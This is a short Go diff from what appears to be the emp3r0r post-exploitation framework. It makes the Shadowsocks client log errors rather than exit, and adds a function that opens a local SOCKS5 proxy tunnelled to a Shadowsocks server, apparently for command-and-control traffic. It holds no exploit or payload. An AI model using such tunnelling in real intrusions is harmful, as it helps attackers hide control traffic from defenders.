@@ -9,17 +9,19 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/ss"
 )
 
+// SS_Ctx, SS_Cancel context for Shadowsocks client, call SS_Cancel() to stop existing Shadowsocks client
 var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())
 
 func startShadowsocksClient(ss_serverAddr, localSocksAddr, tcptun string) {
 	ss_config := createSSConfig(ss_serverAddr, localSocksAddr, tcptun, false)
 	err := ss.SSMain(ss_config)
 	if err != nil {
-		log.Fatalf("ShadowsocksProxy failed to start: %v", err)
+		log.Printf("ShadowsocksProxy failed to start: %v", err)
+		return
 	}
 
 	defer func() {
-		log.Print("Shadowsocks client exited")
+		log.Printf("Shadowsocks client (%v) exited", ss_config)
 		ss_config.Cancel()
 	}()
 
@@ -61,6 +63,18 @@ func ShadowsocksC2Client() {
 	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksLocalSocksPort
 
 	startShadowsocksClient(server_addr, local_socks_addr, "")
+}
+
+// Start ShadowsocksLocalSocks client, you get a SOCKS5 proxy server at lport
+func ShadowsocksLocalSocks(ss_server, lport string) {
+	log.Printf("ShadowsocksLocalSocks: %s:%s", ss_server, lport)
+	ss_server_port := RuntimeConfig.ShadowsocksServerPort
+	ss_server_ip := ss_server
+
+	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)
+
+	local_socks_addr := "127.0.0.1:" + lport
+	startShadowsocksClient(ss_server_addr, local_socks_addr, "")
 }
 
 // Start ShadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
